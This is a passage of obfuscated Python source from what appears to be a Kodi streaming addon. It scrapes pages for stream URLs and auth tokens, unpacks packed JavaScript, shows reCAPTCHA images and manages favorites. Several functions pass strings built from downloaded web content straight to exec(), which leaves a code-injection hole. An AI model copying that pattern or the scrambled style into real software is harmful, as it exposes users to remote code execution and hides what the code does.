  ooooOoO0O = II1iIi11 ( page_data , '&ver_t=([^&]+)&' ) + '?wmsAuthSign=' + II1iIi11 ( page_data , 'wmsAuthSign%3D([^%&]+)' ) + '==/mp4:' + II1iIi11 ( page_data , '\\?y=([^&]+)&' )
 else :
  ooooOoO0O = II1iIi11 ( page_data , 'href="([^"]+)"[^"]+$' )
  if len ( ooooOoO0O ) == 0 :
   ooooOoO0O = page_data
 ooooOoO0O = ooooOoO0O . replace ( ' ' , '%20' )
 return ooooOoO0O
 if 1 - 1: I11i / I1ii11iIi11i + Ii1I . OOooOOo / I11i - Oo0ooO0oo0oO
def II1iIi11 ( data , re_patten ) :
 i1 = ''
 iII1I1 = re . search ( re_patten , data )
 if iII1I1 != None :
  i1 = iII1I1 . group ( 1 )
 else :
  i1 = ''
 return i1
 if 5 - 5: iii1I1I
def OOo0o0Oo ( page_data ) :
 ooooOoO0O = ''
 if '127.0.0.1' in page_data :
  ooooOoO0O = II1iIi11 ( page_data , '&ver_t=([^&]+)&' ) + ' live=true timeout=15 playpath=' + II1iIi11 ( page_data , '\\?y=([a-zA-Z0-9-_\\.@]+)' )
  if 4 - 4: Oo0ooO0oo0oO % II / I1ii11iIi11i . iii1I1I / iii1I1I - I11i
 if II1iIi11 ( page_data , 'token=([^&]+)&' ) != '' :
  ooooOoO0O = ooooOoO0O + '?token=' + II1iIi11 ( page_data , 'token=([^&]+)&' )
 elif II1iIi11 ( page_data , 'wmsAuthSign%3D([^%&]+)' ) != '' :
  ooooOoO0O = II1iIi11 ( page_data , '&ver_t=([^&]+)&' ) + '?wmsAuthSign=' + II1iIi11 ( page_data , 'wmsAuthSign%3D([^%&]+)' ) + '==/mp4:' + II1iIi11 ( page_data , '\\?y=([^&]+)&' )
 else :
  ooooOoO0O = II1iIi11 ( page_data , 'HREF="([^"]+)"' )
  if 79 - 79: I11i + II
 if 'dag1.asx' in ooooOoO0O :
  return oOO ( ooooOoO0O )
  if 10 - 10: oOo0O0Ooo + O0
 if 'devinlivefs.fplive.net' not in ooooOoO0O :
  ooooOoO0O = ooooOoO0O . replace ( 'devinlive' , 'flive' )
 if 'permlivefs.fplive.net' not in ooooOoO0O :
  ooooOoO0O = ooooOoO0O . replace ( 'permlive' , 'flive' )
 return ooooOoO0O
 if 43 - 43: iIii1I11I1II1 / oO0OooOoO % OOooOOo - iii1I1I
 if 62 - 62: O00oOoOoO0o0O
def O000oOo ( str_eval ) :
 OoOOOO = ""
 try :
  I1iiIi111I = "w,i,s,e=(" + str_eval + ')'
  exec ( I1iiIi111I )
  OoOOOO = Iiii1iIii ( w , i , s , e )
 except : traceback . print_exc ( file = sys . stdout )
 if 69 - 69: Ii1I % OoooooooOO . o0Oo
 return OoOOOO
 if 34 - 34: O0oo0OO0 * oO0o - I1i1iI1i - o0Oo - O0oo0OO0
def Iiii1iIii ( w , i , s , e ) :
 Ii1iIi111I1i = 0 ;
 I1III111i = 0 ;
 iiI1iii = 0 ;
 OOoOOo00O0o0 = [ ] ;
 Oo0O0Oo00O = [ ] ;
 while True :
  if ( Ii1iIi111I1i < 5 ) :
   Oo0O0Oo00O . append ( w [ Ii1iIi111I1i ] )
  elif ( Ii1iIi111I1i < len ( w ) ) :
   OOoOOo00O0o0 . append ( w [ Ii1iIi111I1i ] ) ;
  Ii1iIi111I1i += 1 ;
  if ( I1III111i < 5 ) :
   Oo0O0Oo00O . append ( i [ I1III111i ] )
  elif ( I1III111i < len ( i ) ) :
   OOoOOo00O0o0 . append ( i [ I1III111i ] )
  I1III111i += 1 ;
  if ( iiI1iii < 5 ) :
   Oo0O0Oo00O . append ( s [ iiI1iii ] )
  elif ( iiI1iii < len ( s ) ) :
   OOoOOo00O0o0 . append ( s [ iiI1iii ] ) ;
  iiI1iii += 1 ;
  if ( len ( w ) + len ( i ) + len ( s ) + len ( e ) == len ( OOoOOo00O0o0 ) + len ( Oo0O0Oo00O ) + len ( e ) ) :
   break ;
   if 9 - 9: OOooOOo . o0Oo - I11i
 IiiiIiiIIi = '' . join ( OOoOOo00O0o0 )
 i1iiIIiI1iiI = '' . join ( Oo0O0Oo00O )
 I1III111i = 0 ;
 I11Ii111I = [ ] ;
 for Ii1iIi111I1i in range ( 0 , len ( OOoOOo00O0o0 ) , 2 ) :
  if 98 - 98: iIii1I11I1II1 + II % oO0o + O00oOoOoO0o0O % oO0o
  iI1I1I11IiII = - 1 ;
  if ( ord ( i1iiIIiI1iiI [ I1III111i ] ) % 2 ) :
   iI1I1I11IiII = 1 ;
   if 47 - 47: Ii1I % iIii1I11I1II1
  I11Ii111I . append ( chr ( int ( IiiiIiiIIi [ Ii1iIi111I1i : Ii1iIi111I1i + 2 ] , 36 ) - iI1I1I11IiII ) ) ;
  I1III111i += 1 ;
  if ( I1III111i >= len ( Oo0O0Oo00O ) ) :
   I1III111i = 0 ;
 oOOoOoo0O0 = '' . join ( I11Ii111I )
 if 'eval(function(w,i,s,e)' in oOOoOoo0O0 :
  print 'STILL GOing'
  oOOoOoo0O0 = re . compile ( 'eval\(function\(w,i,s,e\).*}\((.*?)\)' ) . findall ( oOOoOoo0O0 ) [ 0 ]
  return O000oOo ( oOOoOoo0O0 )
 else :
  print 'FINISHED'
  return oOOoOoo0O0
  if 11 - 11: o0Oo % O0oo0OO0 - I1ii11iIi11i - Ii1I + OOooOOo
def ooOo0OoO ( page_value , regex_for_text = '' , iterations = 1 , total_iteration = 1 ) :
 try :
  o0O0O0 = None
  if page_value . startswith ( "http" ) :
   page_value = I1iIi1iiIIiI ( page_value )
  print 'page_value' , page_value
  if regex_for_text and len ( regex_for_text ) > 0 :
   page_value = re . compile ( regex_for_text ) . findall ( page_value ) [ 0 ]
   if 55 - 55: O0 - II
  page_value = oOO0o0oo0 ( page_value , iterations , total_iteration )
 except : traceback . print_exc ( file = sys . stdout )
 print 'unpacked' , page_value
 if 'sav1live.tv' in page_value :
  page_value = page_value . replace ( 'sav1live.tv' , 'sawlive.tv' )
  print 'sav1 unpacked' , page_value
 return page_value
 if 78 - 78: iii1I1I + Oo0ooO0oo0oO . I1i1iI1i
def oOO0o0oo0 ( sJavascript , iteration = 1 , totaliterations = 2 ) :
 print 'iteration' , iteration
 if sJavascript . startswith ( 'var _0xcb8a=' ) :
  OoIIi1iI = sJavascript . split ( 'var _0xcb8a=' )
  I1iiIi111I = "myarray=" + OoIIi1iI [ 1 ] . split ( "eval(" ) [ 0 ]
  exec ( I1iiIi111I )
  oO0Ooo0OooOOo = 62
  O00o0O = int ( OoIIi1iI [ 1 ] . split ( ",62," ) [ 1 ] . split ( ',' ) [ 0 ] )
  iIIIiI = myarray [ 0 ]
  O00 = myarray [ 3 ]
  with open ( 'temp file' + str ( iteration ) + '.js' , "wb" ) as i1iiIII1IIiIIII :
   i1iiIII1IIiIIII . write ( str ( O00 ) )
   if 19 - 19: Oo0ooO0oo0oO - OOooOOo / OOooOOo + oOo0O0Ooo
 else :
  if 98 - 98: iIii1I11I1II1 % iii1I1I + O00oOoOoO0o0O . i11Ii11I1Ii1i
  OoIIi1iI = sJavascript . split ( "rn p}('" )
  print OoIIi1iI
  if 99 - 99: O0 + O0 * O00oOoOoO0o0O + O0 * Ii1I
  iIIIiI , oO0Ooo0OooOOo , O00o0O , O00 = ( '' , '0' , '0' , '' )
  if 80 - 80: o0Oo . O0oo0OO0
  I1iiIi111I = "p1,a1,c1,k1=('" + OoIIi1iI [ 1 ] . split ( ".spli" ) [ 0 ] + ')'
  exec ( I1iiIi111I )
 O00 = O00 . split ( '|' )
 OoIIi1iI = OoIIi1iI [ 1 ] . split ( "))'" )
 if 47 - 47: O00oOoOoO0o0O + i11Ii11I1Ii1i + oO0OooOoO % i11iIiiIii
 if 93 - 93: I11i % oO0o . O0 / Oo0ooO0oo0oO * Ii1I
 if 29 - 29: OOooOOo
 if 86 - 86: oO0OooOoO . I1i1iI1i
 if 2 - 2: OoooooooOO
 if 60 - 60: I1ii11iIi11i
 if 81 - 81: oO0o % O0oo0OO0
 if 87 - 87: iIii1I11I1II1 . OoooooooOO * oO0o
 if 100 - 100: I1ii11iIi11i / i1IIi - o0Oo % O0oo0OO0 - iIii1I11I1II1
 if 17 - 17: O00oOoOoO0o0O / OOooOOo % oOo0O0Ooo
 if 71 - 71: I1i1iI1i . II . I1ii11iIi11i
 if 68 - 68: i11iIiiIii % Ii1I * I1ii11iIi11i * I1i1iI1i * oO0OooOoO + O0
 if 66 - 66: O00oOoOoO0o0O % I11i % OoooooooOO
 if 34 - 34: OOooOOo / Oo0ooO0oo0oO % O0 . I1ii11iIi11i . i1IIi
 if 29 - 29: O0 . II
 if 66 - 66: Ii1I * iIii1I11I1II1 % iIii1I11I1II1 * I1i1iI1i - i11Ii11I1Ii1i - I1i1iI1i
 if 70 - 70: II + Ii1I
 if 93 - 93: II + O0oo0OO0
 if 33 - 33: O0
 if 78 - 78: O0 / oO0OooOoO * I1ii11iIi11i
 if 50 - 50: OoooooooOO - iIii1I11I1II1 + i1IIi % II - iIii1I11I1II1 % O0
 if 58 - 58: I1i1iI1i + iIii1I11I1II1
 OOO0OOO00oo = ''
 O0ooo0O0oo0 = ''
 if 65 - 65: oO0OooOoO - II % OOooOOo - oO0o * Oo0ooO0oo0oO + O0oo0OO0
 if 79 - 79: i11Ii11I1Ii1i . oO0o % II - oOo0O0Ooo
 o0oO0oO0O = str ( ii11II ( iIIIiI , oO0Ooo0OooOOo , O00o0O , O00 , OOO0OOO00oo , O0ooo0O0oo0 , iteration ) )
 if 9 - 9: iIii1I11I1II1 % O00oOoOoO0o0O / oO0o - O0
 if 55 - 55: Oo0ooO0oo0oO - I1ii11iIi11i
 if 100 - 100: O0
 if 79 - 79: iIii1I11I1II1
 if 81 - 81: iii1I1I + iIii1I11I1II1 * II - iIii1I11I1II1 . iii1I1I
 if iteration >= totaliterations :
  if 48 - 48: O00oOoOoO0o0O . OoooooooOO . o0Oo . oO0o % I11i / Oo0ooO0oo0oO
  return o0oO0oO0O
 else :
  if 11 - 11: i1IIi % I1ii11iIi11i % Oo0ooO0oo0oO
  return oOO0o0oo0 ( o0oO0oO0O , iteration + 1 )
  if 99 - 99: i11Ii11I1Ii1i / iIii1I11I1II1 - O0oo0OO0 * I11i % o0Oo
def ii11II ( p , a , c , k , e , d , iteration , v = 1 ) :
 if 13 - 13: I1ii11iIi11i
 if 70 - 70: II + O0 . Ii1I * O0oo0OO0
 if 2 - 2: OoooooooOO . iii1I1I . I1i1iI1i
 while ( c >= 1 ) :
  c = c - 1
  if ( k [ c ] ) :
   I1iIII1IiiI = str ( OOoooOoO0Oo ( c , a ) )
   if v == 1 :
    p = re . sub ( '\\b' + I1iIII1IiiI + '\\b' , k [ c ] , p )
   else :
    p = Oo000 ( p , I1iIII1IiiI , k [ c ] )
    if 48 - 48: i11iIiiIii % Ii1I
    if 29 - 29: Oo0ooO0oo0oO + i11iIiiIii % O00oOoOoO0o0O
    if 93 - 93: oO0o % iIii1I11I1II1
    if 90 - 90: o0Oo - iii1I1I / O0oo0OO0 / O0 / O00oOoOoO0o0O
    if 87 - 87: oO0o / I1i1iI1i + iIii1I11I1II1
    if 93 - 93: iIii1I11I1II1 + Ii1I % i11Ii11I1Ii1i
 return p
 if 21 - 21: iii1I1I
 if 6 - 6: I1i1iI1i
 if 46 - 46: I1i1iI1i + Ii1I
def Oo000 ( source_str , word_to_find , replace_with ) :
 Oo00o0O0O = None
 Oo00o0O0O = source_str . split ( word_to_find )
 if len ( Oo00o0O0O ) > 1 :
  o0ooO0OoOo = [ ]
  o0oOO00 = 0
  for ii11iiIi in Oo00o0O0O :
   if 48 - 48: I1i1iI1i % O00oOoOoO0o0O
   o0ooO0OoOo . append ( ii11iiIi )
   iiii = word_to_find
   if 3 - 3: I1i1iI1i % O0oo0OO0 + oOo0O0Ooo
   if 47 - 47: O0 * o0Oo * I1ii11iIi11i . oO0OooOoO
   if o0oOO00 == len ( Oo00o0O0O ) - 1 :
    iiii = ''
   else :
    if len ( ii11iiIi ) == 0 :
     if ( len ( Oo00o0O0O [ o0oOO00 + 1 ] ) == 0 and word_to_find [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) or ( len ( Oo00o0O0O [ o0oOO00 + 1 ] ) > 0 and Oo00o0O0O [ o0oOO00 + 1 ] [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) :
      iiii = replace_with
      if 95 - 95: O0oo0OO0 % I1i1iI1i . O0 % II
    else :
     if ( Oo00o0O0O [ o0oOO00 ] [ - 1 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) and ( ( len ( Oo00o0O0O [ o0oOO00 + 1 ] ) == 0 and word_to_find [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) or ( len ( Oo00o0O0O [ o0oOO00 + 1 ] ) > 0 and Oo00o0O0O [ o0oOO00 + 1 ] [ 0 ] . lower ( ) not in 'abcdefghijklmnopqrstuvwxyz1234567890_' ) ) :
      iiii = replace_with
      if 68 - 68: oOo0O0Ooo . oOo0O0Ooo - I11i / O00oOoOoO0o0O . i11Ii11I1Ii1i / i1IIi
   o0ooO0OoOo . append ( iiii )
   o0oOO00 += 1
   if 12 - 12: I11i * i1IIi * O00oOoOoO0o0O
  source_str = '' . join ( o0ooO0OoOo )
 return source_str
 if 23 - 23: iii1I1I / O0 / o0Oo
def I11o0000o0Oo ( num , radix ) :
 if 90 - 90: iIii1I11I1II1 * oO0OooOoO
 IIIII = ""
 if num == 0 : return '0'
 while num > 0 :
  IIIII = "0123456789abcdefghijklmnopqrstuvwxyz" [ num % radix ] + IIIII
  num /= radix
 return IIIII
 if 70 - 70: OOooOOo * oO0OooOoO - i11Ii11I1Ii1i
def OOoooOoO0Oo ( cc , a ) :
 I1iIII1IiiI = "" if cc < a else OOoooOoO0Oo ( int ( cc / a ) , a )
 cc = ( cc % a )
 oOOoo0 = chr ( cc + 29 ) if cc > 35 else str ( I11o0000o0Oo ( cc , 36 ) )
 return I1iIII1IiiI + oOOoo0
 if 24 - 24: I1ii11iIi11i - Ii1I + I11i / Oo0ooO0oo0oO % o0Oo + iIii1I11I1II1
 if 79 - 79: oO0o / i11Ii11I1Ii1i
def Ii1IIi ( cookieJar ) :
 try :
  oOo00o = ""
  for I1IIII1i , OOoooooooO in enumerate ( cookieJar ) :
   oOo00o += OOoooooooO . name + "=" + OOoooooooO . value + ";"
 except : pass
 if 4 - 4: oOo0O0Ooo + OOooOOo
 return oOo00o
 if 17 - 17: I1ii11iIi11i * oO0o
 if 15 - 15: i11iIiiIii / i11Ii11I1Ii1i % o0Oo
def Iiii1I1 ( cookieJar , COOKIEFILE ) :
 try :
  OoOOoO000O00oO = os . path . join ( i11 , COOKIEFILE )
  cookieJar . save ( OoOOoO000O00oO , ignore_discard = True )
 except : pass
 if 71 - 71: II / I11i * iIii1I11I1II1
def IiiiI ( COOKIEFILE ) :
 if 57 - 57: iii1I1I + II % I11i . I1ii11iIi11i / I1ii11iIi11i * O0
 Ii1iiII1i = None
 if COOKIEFILE :
  try :
   OoOOoO000O00oO = os . path . join ( i11 , COOKIEFILE )
   Ii1iiII1i = cookielib . LWPCookieJar ( )
   Ii1iiII1i . load ( OoOOoO000O00oO , ignore_discard = True )
  except :
   Ii1iiII1i = None
   if 52 - 52: Ii1I / II
 if not Ii1iiII1i :
  Ii1iiII1i = cookielib . LWPCookieJar ( )
  if 91 - 91: I1i1iI1i . oOo0O0Ooo + oO0OooOoO
 return Ii1iiII1i
 if 36 - 36: O0 * I1ii11iIi11i % Oo0ooO0oo0oO * Oo0ooO0oo0oO / I1ii11iIi11i * I1i1iI1i
def o0OO0Oo ( fun_call , page_data , Cookie_Jar ) :
 IiI = ''
 if i1iiIII111ii not in sys . path :
  sys . path . append ( i1iiIII111ii )
  if 87 - 87: i11Ii11I1Ii1i . O0 % II + I11i + O0oo0OO0 % iIii1I11I1II1
 print fun_call
 try :
  ii11iIIi = 'import ' + fun_call . split ( '.' ) [ 0 ]
  print ii11iIIi , sys . path
  exec ( ii11iIIi )
  print 'done'
 except :
  print 'error in import'
  traceback . print_exc ( file = sys . stdout )
 print 'ret_val=' + fun_call
 exec ( 'ret_val=' + fun_call )
 print IiI
 if 1 - 1: Oo0ooO0oo0oO * oO0o
 return str ( IiI )
 if 66 - 66: oO0o + i1IIi % oO0OooOoO . O0 * I11i % I11i
def II1i111 ( url ) :
 O0oOO0o = I1iIi1iiIIiI ( url )
 iiiiI1IiI1I1 = ""
 iI111i11iI1 = ""
 III1ii = "<script.*?src=\"(.*?recap.*?)\""
 i1 = re . findall ( III1ii , O0oOO0o )
 iI1III1iIi11 = False
 i11I1I = None
 iI111i11iI1 = None
 if 71 - 71: Oo0ooO0oo0oO
 if i1 and len ( i1 ) > 0 :
  Iiii1i11ii1Ii = i1 [ 0 ]
  iI1III1iIi11 = True
  if 12 - 12: iii1I1I . O0oo0OO0
  O0oOI1IiI1iIiIiii = 'challenge.*?\'(.*?)\''
  I1iiI1II = '\'(.*?)\''
  IIIi = I1iIi1iiIIiI ( Iiii1i11ii1Ii )
  iiiiI1IiI1I1 = re . findall ( O0oOI1IiI1iIiIiii , IIIi ) [ 0 ]
  iiii11IiiiiIi = 'http://www.google.com/recaptcha/api/reload?c=' ;
  oo0oo0O0 = Iiii1i11ii1Ii . split ( 'k=' ) [ 1 ]
  iiii11IiiiiIi += iiiiI1IiI1I1 + '&k=' + oo0oo0O0 + '&captcha_k=1&type=image&lang=en-GB'
  IiIIiiI = I1iIi1iiIIiI ( iiii11IiiiiIi )
  i11I1I = re . findall ( I1iiI1II , IiIIiiI ) [ 0 ]
  o0o0OO0o00o0O = 'http://www.google.com/recaptcha/api/image?c=' + i11I1I
  if not o0o0OO0o00o0O . startswith ( "http" ) :
   o0o0OO0o00o0O = 'http://www.google.com/recaptcha/api/' + o0o0OO0o00o0O
  import random
  Ooo = random . randrange ( 100 , 1000 , 5 )
  IIIIIIi1i = os . path . join ( i11 , str ( Ooo ) + "captcha.img" )
  iiiii11I1 = open ( IIIIIIi1i , "wb" )
  iiiii11I1 . write ( I1iIi1iiIIiI ( o0o0OO0o00o0O ) )
  iiiii11I1 . close ( )
  Ii1 = OOOo ( captcha = IIIIIIi1i )
  iI111i11iI1 = Ii1 . get ( )
  os . remove ( IIIIIIi1i )
 return i11I1I , iI111i11iI1
 if 35 - 35: i11Ii11I1Ii1i - I1ii11iIi11i . oOo0O0Ooo * oOo0O0Ooo / i11iIiiIii + I11i
def I1iIi1iiIIiI ( url , cookieJar = None , post = None , timeout = 20 , headers = None ) :
 if 87 - 87: oO0o % iIii1I11I1II1
 if 72 - 72: iii1I1I . iii1I1I - I11i
 i1IiiI1iIi = urllib2 . HTTPCookieProcessor ( cookieJar )
 oOOo00O0OOOo = urllib2 . build_opener ( i1IiiI1iIi , urllib2 . HTTPBasicAuthHandler ( ) , urllib2 . HTTPHandler ( ) )
 if 48 - 48: oOo0O0Ooo - i11Ii11I1Ii1i + oOo0O0Ooo - o0Oo * i11iIiiIii . Oo0ooO0oo0oO
 o00oOO0 = urllib2 . Request ( url )
 o00oOO0 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36' )
 if headers :
  for OO0OO0OO , I1iIIIiI in headers :
   o00oOO0 . add_header ( OO0OO0OO , I1iIIIiI )
   if 60 - 60: o0Oo . i11iIiiIii + oO0o / I11i * oO0OooOoO * iii1I1I
 oOoo = oOOo00O0OOOo . open ( o00oOO0 , post , timeout = timeout )
 OOooo = oOoo . read ( )
 oOoo . close ( )
 return OOooo ;
 if 59 - 59: oOo0O0Ooo + Oo0ooO0oo0oO - iii1I1I . OOooOOo + o0Oo % Ii1I
def i111Iii ( str , reg = None ) :
 if reg :
  str = re . findall ( reg , str ) [ 0 ]
 o0o0 = urllib . unquote ( str [ 0 : len ( str ) - 1 ] ) ;
 i1iIi1IIiIII1 = '' ;
 for O0i1II1Iiii1I11 in range ( len ( o0o0 ) ) :
  i1iIi1IIiIII1 += chr ( ord ( o0o0 [ O0i1II1Iiii1I11 ] ) - o0o0 [ len ( o0o0 ) - 1 ] ) ;
 i1iIi1IIiIII1 = urllib . unquote ( i1iIi1IIiIII1 )
 print i1iIi1IIiIII1
 return i1iIi1IIiIII1
 if 19 - 19: O00oOoOoO0o0O
def i1I11iIII1i1I ( str ) :
 O00O = re . findall ( 'unescape\(\'(.*?)\'' , str )
 print 'js' , O00O
 if ( not O00O == None ) and len ( O00O ) > 0 :
  for O0OOOOOoo in O00O :
   if 69 - 69: o0Oo + Oo0ooO0oo0oO
   str = str . replace ( O0OOOOOoo , urllib . unquote ( O0OOOOOoo ) )
 return str
 if 7 - 7: Oo0ooO0oo0oO + Ii1I
Iiii1I = 0
def ooOo ( m , html_page , cookieJar ) :
 global Iiii1I
 Iiii1I += 1
 ooooo0Oo0 = m [ 'expre' ]
 O0OO = m [ 'page' ]
 o0 = re . compile ( '\$LiveStreamCaptcha\[([^\]]*)\]' ) . findall ( ooooo0Oo0 ) [ 0 ]
 if 9 - 9: II * oOo0O0Ooo + O0 - II
 Iiii1i11ii1Ii = re . compile ( o0 ) . findall ( html_page ) [ 0 ]
 print ooooo0Oo0 , o0 , Iiii1i11ii1Ii
 if not Iiii1i11ii1Ii . startswith ( "http" ) :
  o00 = 'http://' + "" . join ( O0OO . split ( '/' ) [ 2 : 3 ] )
  if Iiii1i11ii1Ii . startswith ( "/" ) :
   Iiii1i11ii1Ii = o00 + Iiii1i11ii1Ii
  else :
   Iiii1i11ii1Ii = o00 + '/' + Iiii1i11ii1Ii
   if 53 - 53: II * I1i1iI1i / iIii1I11I1II1 / o0Oo % I11i
 IIIIIIi1i = os . path . join ( i11 , str ( Iiii1I ) + "captcha.jpg" )
 iiiii11I1 = open ( IIIIIIi1i , "wb" )
 print ' c capurl' , Iiii1i11ii1Ii
 o00oOO0 = urllib2 . Request ( Iiii1i11ii1Ii )
 o00oOO0 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20100101 Firefox/14.0.1' )
 if 'refer' in m :
  o00oOO0 . add_header ( 'Referer' , m [ 'refer' ] )
 if 'agent' in m :
  o00oOO0 . add_header ( 'User-agent' , m [ 'agent' ] )
 if 'setcookie' in m :
  print 'adding cookie' , m [ 'setcookie' ]
  o00oOO0 . add_header ( 'Cookie' , m [ 'setcookie' ] )
  if 39 - 39: I1ii11iIi11i / OoooooooOO . I1ii11iIi11i * I11i / oO0o
  if 38 - 38: I1ii11iIi11i / i11Ii11I1Ii1i % II * O00oOoOoO0o0O + i11iIiiIii % i11Ii11I1Ii1i
  if 61 - 61: II - O0oo0OO0 % I11i / i11Ii11I1Ii1i / Oo0ooO0oo0oO + iIii1I11I1II1
  if 87 - 87: II + i11Ii11I1Ii1i + O0 / i1IIi % I1i1iI1i / II
 urllib2 . urlopen ( o00oOO0 )
 oOoo = urllib2 . urlopen ( o00oOO0 )
 if 64 - 64: I1ii11iIi11i % I1i1iI1i . II % I1ii11iIi11i + O00oOoOoO0o0O * I1i1iI1i
 iiiii11I1 . write ( oOoo . read ( ) )
 oOoo . close ( )
 iiiii11I1 . close ( )
 Ii1 = OOOo ( captcha = IIIIIIi1i )
 iI111i11iI1 = Ii1 . get ( )
 return iI111i11iI1
 if 83 - 83: OOooOOo % Ii1I + O00oOoOoO0o0O % i11iIiiIii + O0
class OOOo ( xbmcgui . WindowDialog ) :
 def __init__ ( self , * args , ** kwargs ) :
  self . cptloc = kwargs . get ( 'captcha' )
  self . img = xbmcgui . ControlImage ( 335 , 30 , 624 , 60 , self . cptloc )
  self . addControl ( self . img )
  self . kbd = xbmc . Keyboard ( )
  if 65 - 65: iIii1I11I1II1 % Ii1I + O0 / OoooooooOO
 def get ( self ) :
  self . show ( )
  time . sleep ( 2 )
  self . kbd . doModal ( )
  if ( self . kbd . isConfirmed ( ) ) :
   O0000oO0o00 = self . kbd . getText ( )
   self . close ( )
   return O0000oO0o00
  self . close ( )
  return False
  if 80 - 80: OoooooooOO + I1i1iI1i
  if 95 - 95: II / Ii1I * II - OoooooooOO * OoooooooOO % I1ii11iIi11i
  if 43 - 43: oOo0O0Ooo . II
class I1I1i1i ( xbmcgui . WindowDialog ) :
 if 87 - 87: oO0o / I1i1iI1i . i11Ii11I1Ii1i - iii1I1I / I1ii11iIi11i
 def __init__ ( self ) :
  self . addControl ( xbmcgui . ControlImage ( 240 , 130 , 840 , 480 , Ii1I1Ii ) )
  if 41 - 41: oO0OooOoO
  if 27 - 27: oOo0O0Ooo * oO0o % iIii1I11I1II1 . o0Oo
  if 70 - 70: O00oOoOoO0o0O % oO0OooOoO % O0 . i1IIi / II
 def onAction ( self , action ) :
  if action == OO0ooOoOO0OOo :
   self . close ( self )
   if 51 - 51: iIii1I11I1II1 * OOooOOo / iIii1I11I1II1 . iIii1I11I1II1 . Oo0ooO0oo0oO * O00oOoOoO0o0O
  if action == oO0oo0o00o0O :
   self . close ( self )
   if 80 - 80: iIii1I11I1II1
OO0ooOoOO0OOo = 10
oO0oo0o00o0O = 92
if 23 - 23: oO0OooOoO
def OOOooo0OooOoO ( ) :
 import time
 return str ( int ( time . time ( ) * 1000 ) )
 if 71 - 71: II * oOo0O0Ooo . O00oOoOoO0o0O
def OoOooo ( ) :
 import time
 return str ( int ( time . time ( ) ) )
 if 49 - 49: I1i1iI1i * O0 . I1i1iI1i
def ii1II1II ( ) :
 i11i11II11i = [ ]
 II1Ii1I1i = sys . argv [ 2 ]
 if len ( II1Ii1I1i ) >= 2 :
  OOooOooo0OOo0 = sys . argv [ 2 ]
  oo0o0OoOO0o0 = OOooOooo0OOo0 . replace ( '?' , '' )
  if ( OOooOooo0OOo0 [ len ( OOooOooo0OOo0 ) - 1 ] == '/' ) :
   OOooOooo0OOo0 = OOooOooo0OOo0 [ 0 : len ( OOooOooo0OOo0 ) - 2 ]
  III1III11II = oo0o0OoOO0o0 . split ( '&' )
  i11i11II11i = { }
  for O0i1II1Iiii1I11 in range ( len ( III1III11II ) ) :
   iIi1iI = { }
   iIi1iI = III1III11II [ O0i1II1Iiii1I11 ] . split ( '=' )
   if ( len ( iIi1iI ) ) == 2 :
    i11i11II11i [ iIi1iI [ 0 ] ] = iIi1iI [ 1 ]
 return i11i11II11i
 if 63 - 63: I1ii11iIi11i / oO0o * iIii1I11I1II1 . II
 if 85 - 85: i11iIiiIii / i11iIiiIii . I1ii11iIi11i . O0
def OooOo ( ) :
 II1III = json . loads ( open ( Oo0o0000o0o0 ) . read ( ) )
 IIIIiI11I11 = len ( II1III )
 for O0i1II1Iiii1I11 in II1III :
  iI1i11iII111 = O0i1II1Iiii1I11 [ 0 ]
  Ii1I1Ii = O0i1II1Iiii1I11 [ 1 ]
  oOo0 = O0i1II1Iiii1I11 [ 2 ]
  try :
   i1iI = O0i1II1Iiii1I11 [ 3 ]
   if i1iI == None :
    raise
  except :
   if Ii1IIii11 . getSetting ( 'use_thumb' ) == "true" :
    i1iI = oOo0
   else :
    i1iI = o0O0OOO0Ooo
  try : I1i11ii11 = O0i1II1Iiii1I11 [ 5 ]
  except : I1i11ii11 = None
  try : O0o = O0i1II1Iiii1I11 [ 6 ]
  except : O0o = None
  if 30 - 30: iii1I1I + oO0OooOoO - I1i1iI1i * OoooooooOO
  if O0i1II1Iiii1I11 [ 4 ] == 0 :
   oOoOo0O0OOOoO ( Ii1I1Ii , iI1i11iII111 , oOo0 , i1iI , '' , '' , '' , 'fav' , I1i11ii11 , O0o , IIIIiI11I11 )
  else :
   iIIIIii1 ( iI1i11iII111 , Ii1I1Ii , O0i1II1Iiii1I11 [ 4 ] , oOo0 , o0O0OOO0Ooo , '' , '' , '' , '' , 'fav' )
   if 19 - 19: I1i1iI1i - OOooOOo . iIii1I11I1II1 . oO0o / iii1I1I
   if 87 - 87: oO0o - i11Ii11I1Ii1i - iii1I1I + oOo0O0Ooo % iIii1I11I1II1 / i11iIiiIii
def i1iIIII1iiIIi ( name , url , iconimage , fanart , mode , playlist = None , regexs = None ) :
 i1I1IiI1ii = [ ]
 try :
  if 64 - 64: Oo0ooO0oo0oO * I11i % oO0OooOoO - oO0o + I11i
  name = name . encode ( 'utf-8' , 'ignore' )
 except :
  pass
 if os . path . exists ( Oo0o0000o0o0 ) == False :
  III1ii1iII ( 'Making Favorites File' )
  i1I1IiI1ii . append ( ( name , url , iconimage , fanart , mode , playlist , regexs ) )
  Iiii1iI1i = open ( Oo0o0000o0o0 , "w" )
  Iiii1iI1i . write ( json . dumps ( i1I1IiI1ii ) )
  Iiii1iI1i . close ( )
 else :
  III1ii1iII ( 'Appending Favorites' )
  Iiii1iI1i = open ( Oo0o0000o0o0 ) . read ( )
  iIii11I = json . loads ( Iiii1iI1i )
  iIii11I . append ( ( name , url , iconimage , fanart , mode ) )
  i1I1I = open ( Oo0o0000o0o0 , "w" )
  i1I1I . write ( json . dumps ( iIii11I ) )
  i1I1I . close ( )
  if 62 - 62: oO0o % OOooOOo % o0Oo + I1i1iI1i . I1ii11iIi11i
  if 48 - 48: o0Oo * i11iIiiIii % oO0OooOoO
def ii1I ( name ) :
 iIii11I = json . loads ( open ( Oo0o0000o0o0 ) . read ( ) )
 for I1IIII1i in range ( len ( iIii11I ) ) :
  if iIii11I [ I1IIII1i ] [ 0 ] == name :
   del iIii11I [ I1IIII1i ]
   i1I1I = open ( Oo0o0000o0o0 , "w" )
   i1I1I . write ( json . dumps ( iIii11I ) )
   i1I1I . close ( )
   break
 xbmc . executebuiltin ( "XBMC.Container.Refresh" )
